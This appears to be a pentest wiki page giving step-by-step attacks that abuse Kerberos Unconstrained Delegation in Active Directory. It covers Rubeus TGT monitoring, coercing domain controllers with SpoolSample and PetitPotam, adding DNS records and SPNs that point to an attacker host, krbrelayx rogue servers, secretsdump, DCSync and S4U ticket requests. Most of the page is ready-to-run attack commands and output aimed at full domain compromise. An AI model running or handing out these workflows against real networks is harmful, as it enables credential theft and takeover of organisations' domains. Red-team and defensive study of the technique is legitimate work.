**Unconstrained delegation** — a machine or service account configured with Unconstrained Delegation caches the TGT of *any* user that authenticates to it. Coerce a Domain Controller to authenticate to a host you control that has this flag, capture its TGT, and escalate (typically DCSync). A classic path is a compromised **child DC -> parent DC**.

**Note:** Domain Controllers have Unconstrained Delegation by default (it is required for them).

## Discovery

Use BloodHound to list non-DC principals with Unconstrained Delegation, or Impacket:

```bash

findDelegation.py 'DOMAIN/USER_NAME:USER_PASS'

```

```console

AccountName    AccountType  DelegationType   DelegationRightsTo
-------------  -----------  ---------------  --------------------------------
SRV02$         Computer     Constrained      MSSQLSvc/SRV01.domain.local:1433
SRV-UD01$      Computer     Unconstrained    N/A

```

## From a Windows machine (Rubeus)

Prerequisites: a compromised host configured for Unconstrained Delegation, AV/EDR evasion, and the ability to [coerce a DC's authentication](../../Coercion/Coercing%20Authentication.md).

```powershell

.\Rubeus.exe monitor /interval:5 /nowrap

```

Then coerce a DC to authenticate to that host (or wait), and Rubeus captures its TGT.

### Child -> parent DC example workflow

```powershell

.\Rubeus.exe monitor /interval:5 /nowrap

# Coerce the parent DC (dc01) to authenticate to the compromised child DC (dc02)
SpoolSample.exe dc01.domain.local dc02.dev.domain.local
# or PetitPotam / any other coercion
PetitPotam.py dc02.dev.domain.local dc01.domain.local

# Grab the captured TGT blob on dc02 and convert it for Linux
rubeustoccache.py $blob dc01.kirbi dc01.ccache
export KRB5CCNAME=dc01.ccache

# Act as the parent DC
impacket-smbclient -k -no-pass dc01.domain.local

```

The goal is simply to obtain the high-privileged TGT from the parent DC by any means, then capture it (Rubeus, mimikatz, or krbrelayx).

## From a Linux machine (krbrelayx)

Prerequisites: an account with Unconstrained Delegation, the ability to [create DNS records](DNS%20Record%20Modification.md), and the ability to [coerce a DC](../../Coercion/Coercing%20Authentication.md).

### Machine account with Unconstrained Delegation

Here `UD_HOST` is the machine configured with Unconstrained Delegation.

1. Get the compromised machine account's Kerberos key / password hex / NT hash:

```bash

secretsdump.py 'USER_NAME:USER_PASS@UD_HOST'

```

2. Add a DNS record pointing to the attacker (e.g. `attacker01.domain.local -> ATTACKER_IP`) - see [DNS Record Modification](DNS%20Record%20Modification.md).

3. Add the matching SPN to the compromised machine account (e.g. `HOST/attacker01.domain.local`):

```bash

addspn.py -u 'DOMAIN\UD_HOST$' -p 'UD_NT_HASH' -s 'HOST/ATTACKER_FQDN' -a 'DC_FQDN'

```

4. Start rogue SMB/HTTP servers with `krbrelayx.py`, providing the compromised account's key:

```bash

krbrelayx.py -aesKey 'UD_AESKEY'
# OR
krbrelayx.py --krbhexpass 'UD_PLAINPASSWORDHEX' --krbsalt 'DOMAIN.LOCALhostattacker01.domain.local'

```

**Note:** For computer accounts the krbsalt is `UPPERCASE_REALM || "host" || lowercase_host_fqdn` (e.g. `DOMAIN.LOCALhostattacker01.domain.local`).

5. Coerce a DC to authenticate to the attacker over SMB/HTTP (specify your **FQDN**, not the IP, or Kerberos will not be negotiated) - see [Coercing Authentication](../../Coercion/Coercing%20Authentication.md).

6. Use the captured TGT to DCSync remotely - see [Dump NTDS.dit](../../Credential%20Dumping/Dump%20NTDS.dit.md).

### User account with Unconstrained Delegation

Extra prerequisites: a configured SPN (coerce over SMB for `CIFS/`, over HTTP/WebDAV for `HTTP/`), the SPN's FQDN not yet registered in DNS, and the account's password or NT hash (see [Kerberoasting](../../Kerberos%20Attacks/Kerberoasting.md) or [Domain Password Spraying](../../Reconnaissance/Domain%20Password%20Spraying.md)).

1. Register the SPN's FQDN as a DNS record - see [DNS Record Modification](DNS%20Record%20Modification.md). Tickets for a user account are RC4 by default, so compute the NT hash:

```python

import hashlib
print(hashlib.new('md4', 'USER_PASS'.encode('utf-16le')).hexdigest())

```

2. Start `krbrelayx.py` with the NT hash:

```bash

krbrelayx.py -dc-ip 'DC_IP' -hashes 'LM:NT'

```

3. Coerce authentication over SMB or HTTP depending on the SPN - see [Coercing Authentication](../../Coercion/Coercing%20Authentication.md).

4. Recover the coerced machine account's TGT:

```console

[*] Got ticket for DC$@domain.local [krbtgt@domain.local]
[*] Saving ticket in DC$@domain.local_krbtgt@domain.local.ccache
$ export KRB5CCNAME='DC$@domain.local_krbtgt@domain.local.ccache'

```

5. Request a Service Ticket for a domain user with local admin on the target (pick one that is not "cannot be delegated" in BloodHound):

```bash

# format: kerberos+ccache://domain\user:file.ccache@<dc-ip>
gets4uticket.py 'kerberos+ccache://DOMAIN\TARGET$:FILE.ccache@DC_IP' 'cifs/TARGET_FQDN@DOMAIN' 'ADM_NAME@DOMAIN' output.ccache

```

Then use the Service Ticket - see [Windows Remote Command Execution](../../Lateral%20Movement/Windows%20Remote%20Command%20Execution.md).

## Caution

Cleanup - remove the SPN and DNS record you added:

```bash

addspn.py -u 'DOMAIN\COMPUTER$' -p 'COMPUTER_NT_HASH' -s 'HOST/ATTACKER_FQDN' -r 'DC_FQDN'

```

Remove the DNS record as shown in [DNS Record Modification](DNS%20Record%20Modification.md).

## References

- krbrelayx - https://github.com/dirkjanm/krbrelayx
- Dirk-jan - Unconstrained delegation abuse - https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/
